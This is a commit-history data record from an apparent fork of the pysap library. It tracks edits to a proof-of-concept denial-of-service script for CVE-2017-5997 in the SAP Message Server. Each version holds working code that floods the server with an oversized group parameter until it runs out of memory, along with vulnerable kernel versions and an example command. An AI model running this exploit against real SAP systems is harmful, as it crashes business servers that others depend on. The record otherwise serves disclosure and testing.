\"This example script can be used to tests against CVE-2017-5997 Denial of Service vulnerability\" \\\n                  \"affecting the Message Server. For more details about the vulnerability see Advisory \" \\\n                  \"https:\/\/erpscan.com\/advisories\/erpscan-16-038-sap-message-server-http-remote-dos\/.\"\n\n    epilog = \"pysap %(version)s - %(url)s - %(repo)s\" % {\"version\": pysap.__version__,\n                                                         \"url\": pysap.__url__,\n                                                         \"repo\": pysap.__repo__}\n\n    usage = \"Usage: %prog [options] -d <remote host>\"\n\n    parser = OptionParser(usage=usage, description=description, epilog=epilog)\n\n    target = OptionGroup(parser, \"Target\")\n    target.add_option(\"-d\", \"--remote-host\", dest=\"remote_host\",\n                      help=\"Remote host\")\n    target.add_option(\"-p\", \"--remote-port\", dest=\"remote_port\", type=\"int\", default=8101,\n                      help=\"Remote port [%default]\")\n    target.add_option(\"--route-string\", dest=\"route_string\",\n                      help=\"Route string for connecting through a SAP Router\")\n    parser.add_option_group(target)\n\n    misc = OptionGroup(parser, \"Misc options\")\n    misc.add_option(\"-l\", \"--loop\", dest=\"loop\", action=\"store_true\", default=False,\n                    help=\"Loop until the user cancel (Ctrl+C) [%default]\")\n    misc.add_option(\"-n\", \"--number\", dest=\"number\", type=\"int\", default=10,\n                    help=\"Number of packets to send [%default]\")\n    misc.add_option(\"-t\", \"--time\", dest=\"delay\", type=\"int\", default=5,\n                    help=\"Time to wait between each round [%default]\")\n    misc.add_option(\"-v\", \"--verbose\", dest=\"verbose\", action=\"store_true\", default=False,\n                    help=\"Verbose output [%default]\")\n    misc.add_option(\"--terminal\", dest=\"terminal\", default=None,\n                    help=\"Terminal name\")\n    parser.add_option_group(misc)\n\n    (options, _) = parser.parse_args()\n\n    if not (options.remote_host or options.route_string):\n        parser.error(\"Remote host or route string is required\")\n\n    return options\n\ndef send_crash(host, port, item, verbose, route=None):\n    # Create the connection to the SAP Netweaver server\n    if verbose:\n        print(\"[*] Sending crash\")\n    # Initiate the connection\n    try:\n        requests.get(host+\":\"+str(port)+item)\n    except:\n        pass\n\n# Main function\ndef main():\n    options = parse_options()\n\n    if options.verbose:\n        logging.basicConfig(level=logging.DEBUG)\n\n    print(\"[*] Testing Message Server CVE-2017-5997 DoS vulnerability on host %s:%d\" % (options.remote_host,\n                                                                                        options.remote_port))\n\n    # Crafting the item\n\n    item = \"\/msgserver\/html\/group?group=\"+'A'*65000\n\n    try:\n        if options.loop:\n            try:\n                while True:\n                    send_crash(options.remote_host, options.remote_port, item, options.verbose, options.route_string)\n                    sleep(options.delay)\n            except KeyboardInterrupt:\n                print(\"[*] Cancelled by the user\")\n        else:\n            for i in range(options.number):\n                send_crash(options.remote_host, options.remote_port, item, options.verbose, options.route_string)\n                sleep(options.delay)\n\n    except SocketError:\n        print(\"[*] Connection error, take a look at the enqueue server process !\")\n\n\nif __name__ == \"__main__\":\n    main()\n"}},"msg":"Update ms_server_denial_of_service.py"},"0d48666fc7de49af8dd468187b2b3e9592cadb92":{"url":"https:\/\/api.github.com\/repos\/gelim\/pysap\/commits\/0d48666fc7de49af8dd468187b2b3e9592cadb92","html_url":"https:\/\/github.com\/gelim\/pysap\/commit\/0d48666fc7de49af8dd468187b2b3e9592cadb92","sha":"0d48666fc7de49af8dd468187b2b3e9592cadb92","keyword":"denial of service update","diff":"diff --git a\/examples\/ms_server_denial_of_service.py b\/examples\/ms_server_denial_of_service.py\nindex 70d918b..e38538b 100644\n--- a\/examples\/ms_server_denial_of_service.py\n+++ b\/examples\/ms_server_denial_of_service.py\n@@ -1,5 +1,4 @@\n #!\/usr\/bin\/env python\n-# coding=utf-8\n # ===========\n # pysap - Python library for crafting SAP's network protocols packets\n #\n@@ -22,8 +21,6 @@\n # GNU General Public License for more details.\n # ==============\n \n-\n-\n \"\"\"\n Vulnerable SAP Kernel versions\n \n@@ -46,7 +43,7 @@\n SAP KERNEL 7.49 64-BIT UNICODE\n \n TECHNICAL DESCRIPTION\n-The message server doesn\u2019t free properly the resources allocation for handling the clients\n+The message server doesn't free properly the resources allocation for handling the clients\n request in the case where the requests size is between 4k and 65k. In this special case,\n the server answers with an empty reply as opposed to the case where the request is greater\n than 65k, then the server will reset the connection. The following shows log of the msgserver\n@@ -54,6 +51,9 @@\n \n [4721576.189056] Out of memory: Kill process 14223 (ms.sapJ45_SCS01) score 243 or sacrifice child\n [4721576.189058] Killed process 14223 (ms.sapJ45_SCS01) total-vm:3321508kB, anon-rss:2468184kB, file-rss:0kB\n+\n+example \n+python ms_server_denial_of_service.py -d SAP_SERVER -p 8101 --route-string ROUTE_STRING -v\n \"\"\"\n \n # Standard imports\n@@ -62,10 +62,13 @@\n from socket import error as SocketError\n from optparse import OptionParser, OptionGroup\n # External imports\n+from pysap.SAPRouter import SAPRoutedStreamSocket, SAPRouterRouteHop\n+from scapy.layers.inet import TCP\n+from scapy.packet import Raw\n from scapy.config import conf\n+import requests\n # Custom imports\n import pysap\n-from pysap.SAPRouter import SAPRoutedStreamSocket\n \n \n # Set the verbosity to 0\n@@ -101,7 +104,7 @@ def parse_options():\n                     help=\"Loop until the user cancel (Ctrl+C) [%default]\")\n     misc.add_option(\"-n\", \"--number\", dest=\"number\", type=\"int\", default=10,\n                     help=\"Number of packets to send [%default]\")\n-    misc.add_option(\"-t\", \"--time\", dest=\"delay\", type=\"int\", default=5,\n+    misc.add_option(\"-t\", \"--time\", dest=\"delay\", type=\"float\", default=5,\n                     help=\"Time to wait between each round [%default]\")\n     misc.add_option(\"-v\", \"--verbose\", dest=\"verbose\", action=\"store_true\", default=False,\n                     help=\"Verbose output [%default]\")\n@@ -121,8 +124,9 @@ def send_crash(host, port, item, verbose, route=None):\n     if verbose:\n         print(\"[*] Sending crash\")\n     # Initiate the connection\n-    conn = SAPRoutedStreamSocket.get_nisocket(host, port, route)\n+    conn = SAPRoutedStreamSocket.get_nisocket(host, port, route, talk_mode=1)\n     conn.send(item)\n+    conn.close()\n \n # Main function\n def main():\n@@ -136,8 +140,8 @@ def main():\n \n     # Crafting the item\n \n-    item = \"\\x47\\x45\\x54\\x20\\x2f\\x6d\\x73\\x67\\x73\\x65\\x72\\x76\\x65\\x72\\x2f\\x68\\x74\\x6d\\x6c\\x2f\\x67\\x72\\x6f\\x75\\x70\\x3f\\x67\\x72\\x6f\\x75\\x70\\x3d\" + \"\\x41\" * 65000 + \"\\x20\\x48\\x54\\x54\\x50\\x2f\\x31\\x2e\\x30\\x0a\\x0a\"\n-    options.route_ni_version=0\n+    item = \"GET \/msgserver\/html\/group?group=\" + \"A\" * 65000 + \" HTTP\/1.0\\r\\n\"\n+\n     try:\n         if options.loop:\n             try:\n@@ -152,7 +156,7 @@ def main():\n                 sleep(options.delay)\n \n     except SocketError:\n-        print(\"[*] Connection error, take a look at the enqueue server process !\")\n+        print(\"[*] Connection error, take a look at the message server process !\")\n \n \n if __name__ == \"__main__\":\n","message":"","files":{"\/examples\/ms_server_denial_of_service.py":{"changes":[{"diff":"\n \n TECHNICAL DESCRIPTION\n-The message server doesn\u2019t free properly the resources allocation for handling the clients\n+The message server doesn't free properly the resources allocation for handling the clients\n request in the case where the requests size is between 4k and 65k. In this special case,\n the server answers with an empty reply as opposed to the case where the request is greater\n than 65k, then the server will reset the connection. The following shows log of the msgserver\n","add":1,"remove":1,"filename":"\/examples\/ms_server_denial_of_service.py","badparts":["The message server doesn\u2019t free properly the resources allocation for handling the clients"],"goodparts":["The message server doesn't free properly the resources allocation for handling the clients"]},{"diff":"\n from optparse import OptionParser, OptionGroup\n # External imports\n+from pysap.SAPRouter import SAPRoutedStreamSocket, SAPRouterRouteHop\n+from scapy.layers.inet import TCP\n+from scapy.packet import Raw\n from scapy.config import conf\n+import requests\n # Custom imports\n import pysap\n-from pysap.SAPRouter import SAPRoutedStreamSocket\n \n \n # Set the verbosity to 0\n","add":4,"remove":1,"filename":"\/examples\/ms_server_denial_of_service.py","badparts":["from pysap.SAPRouter import SAPRoutedStreamSocket"],"goodparts":["from pysap.SAPRouter import SAPRoutedStreamSocket, SAPRouterRouteHop","from scapy.layers.inet import TCP","from scapy.packet import Raw","import requests"]},{"diff":"\n                     help=\"Loop until the user cancel (Ctrl+C) [%default]\")\n     misc.add_option(\"-n\", \"--number\", dest=\"number\", type=\"int\", default=10,\n                     help=\"Number of packets to send [%default]\")\n-    misc.add_option(\"-t\", \"--time\", dest=\"delay\", type=\"int\", default=5,\n+    misc.add_option(\"-t\", \"--time\", dest=\"delay\", type=\"float\", default=5,\n                     help=\"Time to wait between each round [%default]\")\n     misc.add_option(\"-v\", \"--verbose\", dest=\"verbose\", action=\"store_true\", default=False,\n                     help=\"Verbose output [%default]\")\n","add":1,"remove":1,"filename":"\/examples\/ms_server_denial_of_service.py","badparts":["    misc.add_option(\"-t\", \"--time\", dest=\"delay\", type=\"int\", default=5,"],"goodparts":["    misc.add_option(\"-t\", \"--time\", dest=\"delay\", type=\"float\", default=5,"]},{"diff":"\n     if verbose:\n         print(\"[*] Sending crash\")\n     # Initiate the connection\n-    conn = SAPRoutedStreamSocket.get_nisocket(host, port, route)\n+    conn = SAPRoutedStreamSocket.get_nisocket(host, port, route, talk_mode=1)\n     conn.send(item)\n+    conn.close()\n \n # Main function\n def main():\n","add":2,"remove":1,"filename":"\/examples\/ms_server_denial_of_service.py","badparts":["    conn = SAPRoutedStreamSocket.get_nisocket(host, port, route)"],"goodparts":["    conn = SAPRoutedStreamSocket.get_nisocket(host, port, route, talk_mode=1)","    conn.close()"]},{"diff":"\n \n     # Crafting the item\n \n-    item = \"\\x47\\x45\\x54\\x20\\x2f\\x6d\\x73\\x67\\x73\\x65\\x72\\x76\\x65\\x72\\x2f\\x68\\x74\\x6d\\x6c\\x2f\\x67\\x72\\x6f\\x75\\x70\\x3f\\x67\\x72\\x6f\\x75\\x70\\x3d\" + \"\\x41\" * 65000 + \"\\x20\\x48\\x54\\x54\\x50\\x2f\\x31\\x2e\\x30\\x0a\\x0a\"\n-    options.route_ni_version=0\n+    item = \"GET \/msgserver\/html\/group?group=\" + \"A\" * 65000 + \" HTTP\/1.0\\r\\n\"\n+\n     try:\n         if options.loop:\n             try:\n","add":2,"remove":2,"filename":"\/examples\/ms_server_denial_of_service.py","badparts":["    item = \"\\x47\\x45\\x54\\x20\\x2f\\x6d\\x73\\x67\\x73\\x65\\x72\\x76\\x65\\x72\\x2f\\x68\\x74\\x6d\\x6c\\x2f\\x67\\x72\\x6f\\x75\\x70\\x3f\\x67\\x72\\x6f\\x75\\x70\\x3d\" + \"\\x41\" * 65000 + \"\\x20\\x48\\x54\\x54\\x50\\x2f\\x31\\x2e\\x30\\x0a\\x0a\"","    options.route_ni_version=0"],"goodparts":["    item = \"GET \/msgserver\/html\/group?group=\" + \"A\" * 65000 + \" HTTP\/1.0\\r\\n\""]},{"diff":"\n                 sleep(options.delay)\n \n     except SocketError:\n-        print(\"[*] Connection error, take a look at the enqueue server process !\")\n+        print(\"[*] Connection error, take a look at the message server process !\")\n \n \n if __name__ == \"__main__\":\n","add":1,"remove":1,"filename":"\/examples\/ms_server_denial_of_service.py","badparts":["        print(\"[*] Connection error, take a look at the enqueue server process !\")"],"goodparts":["        print(\"[*] Connection error, take a look at the message server process !\")"]}],"source":"\n \"\"\" Vulnerable SAP Kernel versions SAP KERNEL 7.21 32-BIT UNICODE SAP KERNEL 7.21 32-BITSP716 SAP KERNEL 7.21 64-BIT UNICODE SAP KERNEL 7.21 64-BITSP716 SAP KERNEL 7.21 EXT 32-BIT SAP KERNEL 7.21 EXT 32-BIT UC SAP KERNEL 7.21 EXT 64-BIT SAP KERNEL 7.21 EXT 64-BIT UC SAP KERNEL 7.22 64-BIT SAP KERNEL 7.22 64-BIT UNICODE SAP KERNEL 7.22 EXT 64-BIT SAP KERNEL 7.22 EXT 64-BIT UC SAP KERNEL 7.42 64-BIT SAP KERNEL 7.42 64-BIT UNICODE SAP KERNEL 7.45 64-BIT SAP KERNEL 7.45 64-BIT UNICODE SAP KERNEL 7.49 64-BIT UNICODE TECHNICAL DESCRIPTION The message server doesn\u2019t free properly the resources allocation for handling the clients request in the case where the requests size is between 4k and 65k. In this special case, the server answers with an empty reply as opposed to the case where the request is greater than 65k, then the server will reset the connection. The following shows log of the msgserver process being killed because of too much memory allocated: [4721576.189056] Out of memory: Kill process 14223(ms.sapJ45_SCS01) score 243 or sacrifice child [4721576.189058] Killed process 14223(ms.sapJ45_SCS01) total-vm:3321508kB, anon-rss:2468184kB, file-rss:0kB \"\"\" import logging from time import sleep from socket import error as SocketError from optparse import OptionParser, OptionGroup from scapy.config import conf import pysap from pysap.SAPRouter import SAPRoutedStreamSocket conf.verb=0 def parse_options(): description=\"This example script can be used to tests against CVE-2017-5997 Denial of Service vulnerability\" \\ \"affecting the Message Server. For more details about the vulnerability see Advisory \" \\ \"https:\/\/erpscan.com\/advisories\/erpscan-16-038-sap-message-server-http-remote-dos\/.\" epilog=\"pysap %(version)s -%(url)s -%(repo)s\" %{\"version\": pysap.__version__, \"url\": pysap.__url__, \"repo\": pysap.__repo__} usage=\"Usage: %prog[options] -d <remote host>\" parser=OptionParser(usage=usage, description=description, epilog=epilog) target=OptionGroup(parser, \"Target\") target.add_option(\"-d\", \"--remote-host\", dest=\"remote_host\", help=\"Remote host\") target.add_option(\"-p\", \"--remote-port\", dest=\"remote_port\", type=\"int\", default=8101, help=\"Remote port[%default]\") target.add_option(\"--route-string\", dest=\"route_string\", help=\"Route string for connecting through a SAP Router\") parser.add_option_group(target) misc=OptionGroup(parser, \"Misc options\") misc.add_option(\"-l\", \"--loop\", dest=\"loop\", action=\"store_true\", default=False, help=\"Loop until the user cancel(Ctrl+C)[%default]\") misc.add_option(\"-n\", \"--number\", dest=\"number\", type=\"int\", default=10, help=\"Number of packets to send[%default]\") misc.add_option(\"-t\", \"--time\", dest=\"delay\", type=\"int\", default=5, help=\"Time to wait between each round[%default]\") misc.add_option(\"-v\", \"--verbose\", dest=\"verbose\", action=\"store_true\", default=False, help=\"Verbose output[%default]\") misc.add_option(\"--terminal\", dest=\"terminal\", default=None, help=\"Terminal name\") parser.add_option_group(misc) (options, _)=parser.parse_args() if not(options.remote_host or options.route_string): parser.error(\"Remote host or route string is required\") return options def send_crash(host, port, item, verbose, route=None): if verbose: print(\"[*] Sending crash\") conn=SAPRoutedStreamSocket.get_nisocket(host, port, route) conn.send(item) def main(): options=parse_options() if options.verbose: logging.basicConfig(level=logging.DEBUG) print(\"[*] Testing Message Server CVE-2017-5997 DoS vulnerability on host %s:%d\" %(options.remote_host, options.remote_port)) item=\"\\x47\\x45\\x54\\x20\\x2f\\x6d\\x73\\x67\\x73\\x65\\x72\\x76\\x65\\x72\\x2f\\x68\\x74\\x6d\\x6c\\x2f\\x67\\x72\\x6f\\x75\\x70\\x3f\\x67\\x72\\x6f\\x75\\x70\\x3d\" +\"\\x41\" * 65000 +\"\\x20\\x48\\x54\\x54\\x50\\x2f\\x31\\x2e\\x30\\x0a\\x0a\" options.route_ni_version=0 try: if options.loop: try: while True: send_crash(options.remote_host, options.remote_port, item, options.verbose, options.route_string) sleep(options.delay) except KeyboardInterrupt: print(\"[*] Cancelled by the user\") else: for i in range(options.number): send_crash(options.remote_host, options.remote_port, item, options.verbose, options.route_string) sleep(options.delay) except SocketError: print(\"[*] Connection error, take a look at the enqueue server process !\") if __name__==\"__main__\": main() ","sourceWithComments":"#!\/usr\/bin\/env python\n# coding=utf-8\n# ===========\n# pysap - Python library for crafting SAP's network protocols packets\n#\n# Copyright (C) 2012-2017 by Martin Gallo, Core Security\n#\n# The vulnerability had found by Mathieu Geli\n# PoC by Vahagn Vardanyan\n#\n# The library was designed and developed by Martin Gallo from the Security\n# Consulting Services team of Core Security.\n#\n# This program is free software; you can redistribute it and\/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n# ==============\n\n\n\n\"\"\"\nVulnerable SAP Kernel versions\n\nSAP KERNEL 7.21 32-BIT UNICODE\nSAP KERNEL 7.21 32-BITSP716\nSAP KERNEL 7.21 64-BIT UNICODE\nSAP KERNEL 7.21 64-BITSP716\nSAP KERNEL 7.21 EXT 32-BIT\nSAP KERNEL 7.21 EXT 32-BIT UC\nSAP KERNEL 7.21 EXT 64-BIT\nSAP KERNEL 7.21 EXT 64-BIT UC\nSAP KERNEL 7.22 64-BIT\nSAP KERNEL 7.22 64-BIT UNICODE\nSAP KERNEL 7.22 EXT 64-BIT\nSAP KERNEL 7.22 EXT 64-BIT UC\nSAP KERNEL 7.42 64-BIT\nSAP KERNEL 7.42 64-BIT UNICODE\nSAP KERNEL 7.45 64-BIT\nSAP KERNEL 7.45 64-BIT UNICODE\nSAP KERNEL 7.49 64-BIT UNICODE\n\nTECHNICAL DESCRIPTION\nThe message server doesn\u2019t free properly the resources allocation for handling the clients\nrequest in the case where the requests size is between 4k and 65k. In this special case,\nthe server answers with an empty reply as opposed to the case where the request is greater\nthan 65k, then the server will reset the connection. The following shows log of the msgserver\nprocess being killed because of too much memory allocated:\n\n[4721576.189056] Out of memory: Kill process 14223 (ms.sapJ45_SCS01) score 243 or sacrifice child\n[4721576.189058] Killed process 14223 (ms.sapJ45_SCS01) total-vm:3321508kB, anon-rss:2468184kB, file-rss:0kB\n\"\"\"\n\n# Standard imports\nimport logging\nfrom time import sleep\nfrom socket import error as SocketError\nfrom optparse import OptionParser, OptionGroup\n# External imports\nfrom scapy.config import conf\n# Custom imports\nimport pysap\nfrom pysap.SAPRouter import SAPRoutedStreamSocket\n\n\n# Set the verbosity to 0\nconf.verb = 0\n\n\n# Command line options parser\ndef parse_options():\n\n    description = \"This example script can be used to tests against CVE-2017-5997 Denial of Service vulnerability\" \\\n                  \"affecting the Message Server. For more details about the vulnerability see Advisory \" \\\n                  \"https:\/\/erpscan.com\/advisories\/erpscan-16-038-sap-message-server-http-remote-dos\/.\"\n\n    epilog = \"pysap %(version)s - %(url)s - %(repo)s\" % {\"version\": pysap.__version__,\n                                                         \"url\": pysap.__url__,\n                                                         \"repo\": pysap.__repo__}\n\n    usage = \"Usage: %prog [options] -d <remote host>\"\n\n    parser = OptionParser(usage=usage, description=description, epilog=epilog)\n\n    target = OptionGroup(parser, \"Target\")\n    target.add_option(\"-d\", \"--remote-host\", dest=\"remote_host\",\n                      help=\"Remote host\")\n    target.add_option(\"-p\", \"--remote-port\", dest=\"remote_port\", type=\"int\", default=8101,\n                      help=\"Remote port [%default]\")\n    target.add_option(\"--route-string\", dest=\"route_string\",\n                      help=\"Route string for connecting through a SAP Router\")\n    parser.add_option_group(target)\n\n    misc = OptionGroup(parser, \"Misc options\")\n    misc.add_option(\"-l\", \"--loop\", dest=\"loop\", action=\"store_true\", default=False,\n                    help=\"Loop until the user cancel (Ctrl+C) [%default]\")\n    misc.add_option(\"-n\", \"--number\", dest=\"number\", type=\"int\", default=10,\n                    help=\"Number of packets to send [%default]\")\n    misc.add_option(\"-t\", \"--time\", dest=\"delay\", type=\"int\", default=5,\n                    help=\"Time to wait between each round [%default]\")\n    misc.add_option(\"-v\", \"--verbose\", dest=\"verbose\", action=\"store_true\", default=False,\n                    help=\"Verbose output [%default]\")\n    misc.add_option(\"--terminal\", dest=\"terminal\", default=None,\n                    help=\"Terminal name\")\n    parser.add_option_group(misc)\n\n    (options, _) = parser.parse_args()\n\n    if not (options.remote_host or options.route_string):\n        parser.error(\"Remote host or route string is required\")\n\n    return options\n\ndef send_crash(host, port, item, verbose, route=None):\n    # Create the connection to the SAP Netweaver server\n    if verbose:\n        print(\"[*] Sending crash\")\n    # Initiate the connection\n    conn = SAPRoutedStreamSocket.get_nisocket(host, port, route)\n    conn.send(item)\n\n# Main function\ndef main():\n    options = parse_options()\n\n    if options.verbose:\n        logging.basicConfig(level=logging.DEBUG)\n\n    print(\"[*] Testing Message Server CVE-2017-5997 DoS vulnerability on host %s:%d\" % (options.remote_host,\n                                                                                        options.remote_port))\n\n    # Crafting the item\n\n    item = \"\\x47\\x45\\x54\\x20\\x2f\\x6d\\x73\\x67\\x73\\x65\\x72\\x76\\x65\\x72\\x2f\\x68\\x74\\x6d\\x6c\\x2f\\x67\\x72\\x6f\\x75\\x70\\x3f\\x67\\x72\\x6f\\x75\\x70\\x3d\" + \"\\x41\" * 65000 + \"\\x20\\x48\\x54\\x54\\x50\\x2f\\x31\\x2e\\x30\\x0a\\x0a\"\n    options.route_ni_version=0\n    try:\n        if options.loop:\n            try:\n                while True:\n                    send_crash(options.remote_host, options.remote_port, item, options.verbose, options.route_string)\n                    sleep(options.delay)\n            except KeyboardInterrupt:\n                print(\"[*] Cancelled by the user\")\n        else:\n            for i in range(options.number):\n                send_crash(options.remote_host, options.remote_port, item, options.verbose, options.route_string)\n                sleep(options.delay)\n\n    except SocketError:\n        print(\"[*] Connection error, take a look at the enqueue server process !\")\n\n\nif __name__ == \"__main__\":\n    main()\n"}},"msg":"Update ms_server_denial_of_service.py"},"8da4eb5c92774a6a137ce42a809d89980f1f5766":{"url":"https:\/\/api.github.com\/repos\/gelim\/pysap\/commits\/8da4eb5c92774a6a137ce42a809d89980f1f5766","html_url":"https:\/\/github.com\/gelim\/pysap\/commit\/8da4eb5c92774a6a137ce42a809d89980f1f5766","message":"Update ms_server_denial_of_service.py","sha":"8da4eb5c92774a6a137ce42a809d89980f1f5766","keyword":"denial of service update","diff":"diff --git a\/examples\/ms_server_denial_of_service.py b\/examples\/ms_server_denial_of_service.py\nindex e38538b..c7fb1a7 100644\n--- a\/examples\/ms_server_denial_of_service.py\n+++ b\/examples\/ms_server_denial_of_service.py\n@@ -4,7 +4,7 @@\n #\n # Copyright (C) 2012-2017 by Martin Gallo, Core Security\n #\n-# The vulnerability had found by Mathieu Geli\n+# Vulnerability found by Mathieu Geli\n # PoC by Vahagn Vardanyan\n #\n # The library was designed and developed by Martin Gallo from the Security\n@@ -52,7 +52,7 @@\n [4721576.189056] Out of memory: Kill process 14223 (ms.sapJ45_SCS01) score 243 or sacrifice child\n [4721576.189058] Killed process 14223 (ms.sapJ45_SCS01) total-vm:3321508kB, anon-rss:2468184kB, file-rss:0kB\n \n-example \n+example:\n python ms_server_denial_of_service.py -d SAP_SERVER -p 8101 --route-string ROUTE_STRING -v\n \"\"\"\n \n@@ -63,14 +63,9 @@\n from optparse import OptionParser, OptionGroup\n # External imports\n from pysap.SAPRouter import SAPRoutedStreamSocket, SAPRouterRouteHop\n-from scapy.layers.inet import TCP\n-from scapy.packet import Raw\n from scapy.config import conf\n-import requests\n-# Custom imports\n import pysap\n \n-\n # Set the verbosity to 0\n conf.verb = 0\n \n","files":{"\/examples\/ms_server_denial_of_service.py":{"changes":[{"diff":" [4721576.189056] Out of memory: Kill process 14223 (ms.sapJ45_SCS01) score 243 or sacrifice child\n [4721576.189058] Killed process 14223 (ms.sapJ45_SCS01) total-vm:3321508kB, anon-rss:2468184kB, file-rss:0kB\n \n-example \n+example:\n python ms_server_denial_of_service.py -d SAP_SERVER -p 8101 --route-string ROUTE_STRING -v\n \"\"\"\n \n","add":1,"remove":1,"filename":"\/examples\/ms_server_denial_of_service.py","badparts":["example "],"goodparts":["example:"]},{"diff":" from optparse import OptionParser, OptionGroup\n # External imports\n from pysap.SAPRouter import SAPRoutedStreamSocket, SAPRouterRouteHop\n-from scapy.layers.inet import TCP\n-from scapy.packet import Raw\n from scapy.config import conf\n-import requests\n-# Custom imports\n import pysap\n \n-\n # Set the verbosity to 0\n conf.verb = 0\n \n","add":0,"remove":5,"filename":"\/examples\/ms_server_denial_of_service.py","badparts":["from scapy.layers.inet import TCP","from scapy.packet import Raw","import requests"],"goodparts":[]}],"source":"\n \"\"\" Vulnerable SAP Kernel versions SAP KERNEL 7.21 32-BIT UNICODE SAP KERNEL 7.21 32-BITSP716 SAP KERNEL 7.21 64-BIT UNICODE SAP KERNEL 7.21 64-BITSP716 SAP KERNEL 7.21 EXT 32-BIT SAP KERNEL 7.21 EXT 32-BIT UC SAP KERNEL 7.21 EXT 64-BIT SAP KERNEL 7.21 EXT 64-BIT UC SAP KERNEL 7.22 64-BIT SAP KERNEL 7.22 64-BIT UNICODE SAP KERNEL 7.22 EXT 64-BIT SAP KERNEL 7.22 EXT 64-BIT UC SAP KERNEL 7.42 64-BIT SAP KERNEL 7.42 64-BIT UNICODE SAP KERNEL 7.45 64-BIT SAP KERNEL 7.45 64-BIT UNICODE SAP KERNEL 7.49 64-BIT UNICODE TECHNICAL DESCRIPTION The message server doesn't free properly the resources allocation for handling the clients request in the case where the requests size is between 4k and 65k. In this special case, the server answers with an empty reply as opposed to the case where the request is greater than 65k, then the server will reset the connection. The following shows log of the msgserver process being killed because of too much memory allocated: [4721576.189056] Out of memory: Kill process 14223(ms.sapJ45_SCS01) score 243 or sacrifice child [4721576.189058] Killed process 14223(ms.sapJ45_SCS01) total-vm:3321508kB, anon-rss:2468184kB, file-rss:0kB example python ms_server_denial_of_service.py -d SAP_SERVER -p 8101 --route-string ROUTE_STRING -v \"\"\" import logging from time import sleep from socket import error as SocketError from optparse import OptionParser, OptionGroup from pysap.SAPRouter import SAPRoutedStreamSocket, SAPRouterRouteHop from scapy.layers.inet import TCP from scapy.packet import Raw from scapy.config import conf import requests import pysap conf.verb=0 def parse_options(): description=\"This example script can be used to tests against CVE-2017-5997 Denial of Service vulnerability\" \\ \"affecting the Message Server. For more details about the vulnerability see Advisory \" \\ \"https:\/\/erpscan.com\/advisories\/erpscan-16-038-sap-message-server-http-remote-dos\/.\" epilog=\"pysap %(version)s -%(url)s -%(repo)s\" %{\"version\": pysap.__version__, \"url\": pysap.__url__, \"repo\": pysap.__repo__} usage=\"Usage: %prog[options] -d <remote host>\" parser=OptionParser(usage=usage, description=description, epilog=epilog) target=OptionGroup(parser, \"Target\") target.add_option(\"-d\", \"--remote-host\", dest=\"remote_host\", help=\"Remote host\") target.add_option(\"-p\", \"--remote-port\", dest=\"remote_port\", type=\"int\", default=8101, help=\"Remote port[%default]\") target.add_option(\"--route-string\", dest=\"route_string\", help=\"Route string for connecting through a SAP Router\") parser.add_option_group(target) misc=OptionGroup(parser, \"Misc options\") misc.add_option(\"-l\", \"--loop\", dest=\"loop\", action=\"store_true\", default=False, help=\"Loop until the user cancel(Ctrl+C)[%default]\") misc.add_option(\"-n\", \"--number\", dest=\"number\", type=\"int\", default=10, help=\"Number of packets to send[%default]\") misc.add_option(\"-t\", \"--time\", dest=\"delay\", type=\"float\", default=5, help=\"Time to wait between each round[%default]\") misc.add_option(\"-v\", \"--verbose\", dest=\"verbose\", action=\"store_true\", default=False, help=\"Verbose output[%default]\") misc.add_option(\"--terminal\", dest=\"terminal\", default=None, help=\"Terminal name\") parser.add_option_group(misc) (options, _)=parser.parse_args() if not(options.remote_host or options.route_string): parser.error(\"Remote host or route string is required\") return options def send_crash(host, port, item, verbose, route=None): if verbose: print(\"[*] Sending crash\") conn=SAPRoutedStreamSocket.get_nisocket(host, port, route, talk_mode=1) conn.send(item) conn.close() def main(): options=parse_options() if options.verbose: logging.basicConfig(level=logging.DEBUG) print(\"[*] Testing Message Server CVE-2017-5997 DoS vulnerability on host %s:%d\" %(options.remote_host, options.remote_port)) item=\"GET \/msgserver\/html\/group?group=\" +\"A\" * 65000 +\" HTTP\/1.0\\r\\n\" try: if options.loop: try: while True: send_crash(options.remote_host, options.remote_port, item, options.verbose, options.route_string) sleep(options.delay) except KeyboardInterrupt: print(\"[*] Cancelled by the user\") else: for i in range(options.number): send_crash(options.remote_host, options.remote_port, item, options.verbose, options.route_string) sleep(options.delay) except SocketError: print(\"[*] Connection error, take a look at the message server process !\") if __name__==\"__main__\": main() ","sourceWithComments":"#!\/usr\/bin\/env python\n# ===========\n# pysap - Python library for crafting SAP's network protocols packets\n#\n# Copyright (C) 2012-2017 by Martin Gallo, Core Security\n#\n# The vulnerability had found by Mathieu Geli\n# PoC by Vahagn Vardanyan\n#\n# The library was designed and developed by Martin Gallo from the Security\n# Consulting Services team of Core Security.\n#\n# This program is free software; you can redistribute it and\/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n# ==============\n\n\"\"\"\nVulnerable SAP Kernel versions\n\nSAP KERNEL 7.21 32-BIT UNICODE\nSAP KERNEL 7.21 32-BITSP716\nSAP KERNEL 7.21 64-BIT UNICODE\nSAP KERNEL 7.21 64-BITSP716\nSAP KERNEL 7.21 EXT 32-BIT\nSAP KERNEL 7.21 EXT 32-BIT UC\nSAP KERNEL 7.21 EXT 64-BIT\nSAP KERNEL 7.21 EXT 64-BIT UC\nSAP KERNEL 7.22 64-BIT\nSAP KERNEL 7.22 64-BIT UNICODE\nSAP KERNEL 7.22 EXT 64-BIT\nSAP KERNEL 7.22 EXT 64-BIT UC\nSAP KERNEL 7.42 64-BIT\nSAP KERNEL 7.42 64-BIT UNICODE\nSAP KERNEL 7.45 64-BIT\nSAP KERNEL 7.45 64-BIT UNICODE\nSAP KERNEL 7.49 64-BIT UNICODE\n\nTECHNICAL DESCRIPTION\nThe message server doesn't free properly the resources allocation for handling the clients\nrequest in the case where the requests size is between 4k and 65k. In this special case,\nthe server answers with an empty reply as opposed to the case where the request is greater\nthan 65k, then the server will reset the connection. The following shows log of the msgserver\nprocess being killed because of too much memory allocated:\n\n[4721576.189056] Out of memory: Kill process 14223 